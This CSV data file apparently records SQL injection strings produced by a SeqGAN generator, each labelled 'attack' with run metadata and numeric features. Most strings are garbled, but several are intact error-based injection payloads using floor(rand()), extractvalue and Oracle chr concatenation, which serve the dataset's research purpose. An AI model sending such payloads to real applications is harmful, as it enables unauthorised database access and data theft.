gI",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326,298.0,49.0,4.352129695206258,136.0,30.0,96.0,36.0,0.4563758389261745,0.10067114093959731,0.3221476510067114,0.12080536912751678,2.0,0.0,0.0,0.0,1.0,0.0,0.0,14.0,0.0,1.0,4.0,13.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-""  =  ""vn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327,10.0,6.0,2.321928094887362,2.0,0.0,4.0,4.0,0.2,0.0,0.4,0.4,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-U3051--_select union  AND 5192 xdole_r.0   7158  ,  SELECT 3051 group AM (  ||chr  (  5000000,1   )   x DS RG group 1  union union dhr  (  =  =  )     8382  ||choep information_schemaxT concat   select x ANTSI  (  (  112  ||chr  )  *i,hconcat,0x717a767a71  --,concat  x  )a   *    )        )   x  )    )     )   )    )  un",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328,323.0,50.0,4.315263538433699,127.0,42.0,114.0,40.0,0.3931888544891641,0.13003095975232198,0.35294117647058826,0.1238390092879257,0.0,0.0,5.0,0.0,2.0,2.0,0.0,16.0,0.0,3.0,5.0,15.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,1zfq.N,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329,6.0,6.0,2.584962500721156,4.0,1.0,0.0,1.0,0.6666666666666666,0.16666666666666666,0.0,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-6825when  (  ||chuiarxxNCnesaaddasckwhtygo_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330,44.0,28.0,4.6240932663154,31.0,4.0,4.0,5.0,0.7045454545454546,0.09090909090909091,0.09090909090909091,0.11363636363636363,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack," R5584.ATIselectIk  (  (  )  ,  ||chr  (  select from 6082  (   (  rand  *  ||chxut_acs group daur_ounedr_gysthr  (  ,  (  select  where by AND by 5584 0 h from (  6055select concat  =  113  )  =  --ine  4607a from dhr  (0x717a767a71,  select end  #2   (    ,floor  )  ,  (      thenchr  (  =,  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331,296.0,48.0,4.356411694186632,128.0,34.0,97.0,37.0,0.43243243243243246,0.11486486486486487,0.3277027027027027,0.125,0.0,0.0,2.0,0.0,1.0,3.0,0.0,16.0,0.0,3.0,6.0,10.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'zes(     8190||chr  113  ||  u  select 'i'  select DINIMe.chr  (a RDMIEhchr  7881  113  4510   un   ( 0  select FROM AND   (  4232  rand,0x717a767a71,concat  (  4232  (  9067 1  ||cz  106  ,     =,1 else 1 drx m then D by or D 1   INrow_r.niatameuadun2   select WHERE     AND x 1IISpC",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332,463.0,53.0,4.218975656503981,164.0,84.0,169.0,46.0,0.3542116630669546,0.18142548596112312,0.3650107991360691,0.09935205183585313,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.0,1.0,9.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,-0x786913t_rasNads 113  select or x  )     )     )   x   then union D RIx  6237. else  )    8488     )  )   then     (  SELECT else or else 1x  LE5192 hconcat  0x7171706a710x5c   (  case when   (  ||chr  (  =  )     ||  ( or union 1 concat  rand  rand  case when   )  )  )   )    tu5  5023  )  )     || 1 select 0  1 union WHERE D3931IMENSTw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333,341.0,45.0,4.093203568102319,136.0,48.0,129.0,28.0,0.39882697947214074,0.14076246334310852,0.3782991202346041,0.08211143695014662,0.0,0.0,1.0,0.0,0.0,1.0,0.0,18.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,3.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,ANDM ANSTT  (  (  =  #e6237  ) )   s group 1 x ANDchr  (    )  ||chr  (  )   0)   n from 1045fromuas information_schema.chr  (  =  e3051select by   : 5192 dr(  (  (  ||chr   select 3051 select 1  ||chr  (  case group 1  1xtos.  (   ||  'er.ahr  (  ||chr  (  =  ||chr  (  select from ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334,283.0,45.0,4.165118300510147,121.0,25.0,97.0,40.0,0.4275618374558304,0.08833922261484099,0.34275618374558303,0.1413427561837456,1.0,0.0,0.0,0.0,0.0,3.0,0.0,18.0,0.0,1.0,0.0,15.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"11'     ,floor  (  select =  )    or 0 h when  (  8190  =  uaut  (  =  *2   *n   )  select FROM =  (  0  *2   1297  ,  select FROMtr  (  (  113  6055  )  etvysnt_tr   A 1 else 5584 )   9325o andhr  (  )  ),  >  )   and when   (  )     ,  )  ,  select union select group  from s group end  )    x 0 union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335,303.0,45.0,3.9051219673136695,113.0,31.0,126.0,33.0,0.37293729372937295,0.10231023102310231,0.4158415841584158,0.10891089108910891,1.0,0.0,0.0,0.0,3.0,4.0,0.0,18.0,0.0,1.0,5.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,5.0,2.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,1'||  (  select 't  chsp  4607  select   SELECT 5192 3931 INCMiT  6aam   . then union 1 6082  (  =  )   x 3931 5305 'i'  casewhent  addr  a_.cown  utad.(  arr  (  )    )    having x by 0 1 when or.chr  106  )  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336,211.0,48.0,4.362472397428694,86.0,32.0,72.0,21.0,0.4075829383886256,0.15165876777251186,0.3412322274881517,0.0995260663507109,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1O' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'M3326etu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337,306.0,39.0,4.052122928883686,106.0,59.0,109.0,32.0,0.3464052287581699,0.19281045751633988,0.3562091503267974,0.10457516339869281,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"11045nt  (  >  ||chr  )  (0x717a767a71,1   xddrqs(z. concat  )    )  --   or (  )    )     || union  =  case select 'i'b   (  case    8877 concat  118  ||chr  (  ||chr  (  ||  (  =  ||  (  = 5023  || 0  4232  )  ,7469  || group or else and c  rand  )   (  a by )  )    )   )    )        I FROM end  )   )   SELECT   ||where ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338,324.0,51.0,3.8702341934635767,97.0,35.0,139.0,53.0,0.2993827160493827,0.10802469135802469,0.42901234567901236,0.16358024691358025,2.0,0.0,2.0,0.0,0.0,3.0,0.0,24.0,0.0,0.0,2.0,24.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1'5840iaunvas_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339,14.0,13.0,3.6644977792004614,7.0,5.0,0.0,2.0,0.5,0.35714285714285715,0.0,0.14285714285714285,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%9627al,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340,8.0,8.0,3.0,2.0,5.0,0.0,1.0,0.25,0.625,0.0,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '78816825 group unionr  =  6237,concat  (  select from   FROM 7158  =T  )   then when   then  *t  ||ar.chr  ua when   (  (concat  )  ,0x717a767a71,7469(  >  =hr  (  having,floor  (  ||ch  (  0  ||chhr select end  ||ceuna  (  (  )  case from doyssneuaraddsss.t  (  rand    ||chr  s else end   (  =  eltr   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341,563.0,48.0,4.210150388634981,242.0,65.0,189.0,67.0,0.42984014209591476,0.11545293072824156,0.33570159857904086,0.11900532859680284,2.0,0.0,0.0,0.0,3.0,5.0,0.0,32.0,0.0,2.0,9.0,19.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"-""  =  ""N9176",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342,13.0,9.0,2.931208948910323,1.0,4.0,4.0,4.0,0.07692307692307693,0.3076923076923077,0.3076923076923077,0.3076923076923077,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-floorii,0x717a767a71a0 6913  )  )e1045achr  (  rand  4232  )   x   then AND D else wheni   x FROM  (  ,floor  4386  0x717a767a71)   )  --,0x717a767a71,floor  (  )   x  ||c  )    )   )   '   )    )   )       S 0 unionx end   (  ||eerrotr.( 9067      x  case     SELECT 1   ISOUISITT  3326  0  ||chcr  4607  *2e when  106  ||chr  =  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343,336.0,50.0,4.150948622087839,110.0,63.0,126.0,37.0,0.3273809523809524,0.1875,0.375,0.11011904761904762,1.0,0.0,3.0,0.0,1.0,1.0,0.0,18.0,0.0,0.0,4.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '1392uasyyhswua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344,193.0,30.0,3.5725933198352453,49.0,39.0,81.0,24.0,0.2538860103626943,0.20207253886010362,0.41968911917098445,0.12435233160621761,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-7810s chr  (  ||chr  (  )  ||  select union from   from fromu  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345,65.0,23.0,3.7744759844241287,31.0,4.0,21.0,9.0,0.47692307692307695,0.06153846153846154,0.3230769230769231,0.13846153846153847,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'  =  'yuq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346,228.0,33.0,3.7546949061482584,72.0,36.0,92.0,28.0,0.3157894736842105,0.15789473684210525,0.40350877192982454,0.12280701754385964,2.0,2.0,1.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1 3051WHERE when when from a 1 7158  select 8488M  Rp information_schemaue where x s,hr  select concat  (  =  )        AND union FROMunaao 6055  (        )     )   x   then  AND 1 m when   (  9067)  )   from   then1 ||r  (  113  select 3440  ||c group FROM concathr  (  =  4232   )    )   or and 5584 h1.chr  (  (  4232  )   then 5023  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347,346.0,47.0,4.2040914956700215,146.0,48.0,125.0,27.0,0.42196531791907516,0.13872832369942195,0.36127167630057805,0.07803468208092486,0.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,1.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,1.0,1.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  """"  ,floor0x717a767a71,floor  0      ,1   (  ,6055  ||chru,  =  5840  )   or    SELECT else 0IDTFROM.etaU.geaass group 2131  *26055  )  case when   Yhr  select information_schemar 3785INCNITSNUIT||Thhr  (  122  )  ||chr  6237  113  ||cu  =    )   and       4510  es     case 5192 x concat  select113  select 1   WHERE 1u 1  )   )   then ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348,644.0,58.0,4.336477912472439,246.0,112.0,224.0,62.0,0.38198757763975155,0.17391304347826086,0.34782608695652173,0.09627329192546584,0.0,3.0,0.0,0.0,3.0,3.0,0.0,30.0,0.0,1.0,11.0,15.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,-8AND6237aCc'    from     by 2131 chhr  (  ||r  (  *   select end  case Ry AS. x  ernaaxsosues when   (  0  ||chr  (  *   from  ||chr  (  FROMas   by by select 0U   SELECT 1 by LISThs.f  rand  0x7171706a71e  adxx.h  (  113  )  ||  =  ||r  (  a   t  (  )   (  || information_schemaounars ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349,287.0,50.0,4.307028049087679,131.0,25.0,99.0,32.0,0.4564459930313589,0.08710801393728224,0.34494773519163763,0.11149825783972125,1.0,0.0,1.0,0.0,2.0,1.0,0.0,11.0,0.0,1.0,0.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""owwba_alb'  =  '_.)    #elunas 3051 1 else select information_schema.xcr  (  )   from d x else r  (  ||r  (  case =  )  =  (  )   9325  9173       having where 1 DISN.where else and FROM 'i'  select else select or end  =  )and ||  =  )    FROMu2    )   x  end  || fromhr  (  (  i  )   thenchss benchmark  (  ,  6055      2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350,657.0,51.0,3.967865902862722,233.0,69.0,259.0,96.0,0.3546423135464231,0.1050228310502283,0.3942161339421613,0.1461187214611872,4.0,2.0,0.0,0.0,0.0,7.0,0.0,45.0,1.0,3.0,2.0,33.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,0.0,2.0,3.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1""_y.s""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""ees  (  ||chouay_r  (    )  case  (  ||chr  (  select du2  having  =a:p  )   from  1x  z RCT   )    )   FROM   (  rand  caseIM LNAM  end  (,floor  =  )   )       ||counedo_oes.chr  (  ||  113  ||chr  6237  --  =  ada c  (  u2 floor  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351,535.0,52.0,3.9914018070582005,196.0,45.0,218.0,76.0,0.3663551401869159,0.08411214953271028,0.4074766355140187,0.14205607476635515,0.0,3.0,2.0,0.0,2.0,5.0,0.0,38.0,0.0,5.0,6.0,19.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1-7319WHERE  ||cr  6270,1xxchr  (  select from group 1 1  dcr  (  ||char  ,w  e0x7171706a71ar_adadrt_ned_sUn   (  ||USwz.foou'  =  'j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352,133.0,42.0,4.62792554386078,61.0,22.0,31.0,19.0,0.45864661654135336,0.16541353383458646,0.23308270676691728,0.14285714285714285,2.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,3.0,2.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0
attack,"1'5840  )   4510Ininxwhere information_schemavs.end  )   )0x78   and  =  0   )    )     )   then  concat  chr  1045  rand  chr  (  select L from WHERE d RC 1 by xIT  select or 2017E=  )and 7158    )     113  6237,floor  a concat  *  SELECT G by when   (  ||chr  chr  =  (  )     )     3074   )   (  )   then FROM from =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353,323.0,52.0,4.203637010070859,135.0,37.0,122.0,29.0,0.4179566563467492,0.11455108359133127,0.37770897832817335,0.08978328173374613,1.0,0.0,2.0,0.0,1.0,4.0,0.0,16.0,0.0,1.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'wwbet_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354,303.0,38.0,4.02396373891856,106.0,55.0,109.0,33.0,0.34983498349834985,0.18151815181518152,0.35973597359735976,0.10891089108910891,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,1.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1""'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'xnam   )    #in   )    then by 1 where dYduchr  (  rand  113  )  ,   benchmark  (  )   from 1    )     )    SELECTITe when  selects (  *2 0 FROM from  =  *2   ||cx.dunadtu  (  ,0x717a767a71case 3440  ,   when   WHERE when  select where 5192 a AIiT end  =   )  etee   6913  (  =  ,FROMn   ,  ||oun   (  )     select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355,495.0,55.0,4.026165777951951,174.0,64.0,202.0,55.0,0.3515151515151515,0.1292929292929293,0.4080808080808081,0.1111111111111111,2.0,1.0,0.0,0.0,2.0,4.0,0.0,30.0,0.0,0.0,10.0,10.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,3.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1z)0 or AND m)  112  ||ac  )        )    >o.Toxr.s (  rand  (  4232  )  select from  ,  =  benchmark  )  *  a  )   from group   )     )    ||seria union 4493  ,concat  (  * from 6913  ||chr  xa",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356,193.0,41.0,3.917637684764173,73.0,17.0,77.0,26.0,0.37823834196891193,0.08808290155440414,0.39896373056994816,0.13471502590673576,0.0,0.0,0.0,0.0,2.0,1.0,0.0,12.0,0.0,0.0,2.0,10.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
